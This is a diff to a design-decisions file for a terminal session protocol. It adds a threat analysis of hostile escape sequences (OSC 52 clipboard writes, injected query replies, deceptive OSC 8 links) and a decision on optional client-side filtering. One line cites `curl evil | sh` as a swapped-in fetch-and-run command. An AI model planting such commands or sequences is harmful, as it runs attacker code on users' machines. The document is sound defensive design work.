@@ -81,7 +81,11 @@ Later:
 
 Keystroke recording is not a reliable log of executed shell commands; secret handling and audit boundaries need separate design.
 - ✅ 2026-10-13 Purpose of input recording: quick access to the command history of a Session through an STPT subcommand; input typed with echo off (passwords) is excluded. Recorded on the Server, not a separate stream of the terminal Channel.
-- ❓ Protection of the Client terminal emulator against hostile escape sequences in output (OSC 52 clipboard writes, reports injected as input, misleading OSC 8 links): the protocol passes output unfiltered, like SSH; an optional Client-side filter is to be analysed in Tier PJ.
+- ❓ Protection of the Client terminal emulator against hostile escape sequences in output: to be analysed in Tier PJ. The protocol passes output unfiltered, like SSH (PROTOCOL.md §14.7). Threats from a hostile Server or a compromised process on it:
+  - OSC 52: silent write to the Client clipboard, e.g. replacing a copied command with `curl evil | sh`;
+  - query sequences whose replies come back as input (window title, status reports): with a title set beforehand this is command injection (past CVEs in xterm, iTerm2 and others);
+  - OSC 8 hyperlinks whose visible text differs from the target.
+  - ✅ 2026-10-13 No filtering in the protocol and no full escape-sequence parser: the Server cannot tell legitimate from hostile sequences, and a complex parser is new attack surface. Direction for PJ: an optional Client-side block of a small set of dangerous sequences (OSC 52 writes, queries with replies), leaving everything else intact; not applied when output goes to a file or pipe.
 - ❓ How to extract commands reliably (raw keystrokes vs shell integration such as OSC 133 prompt marks): Tier PH.
 
 # 8	CLI
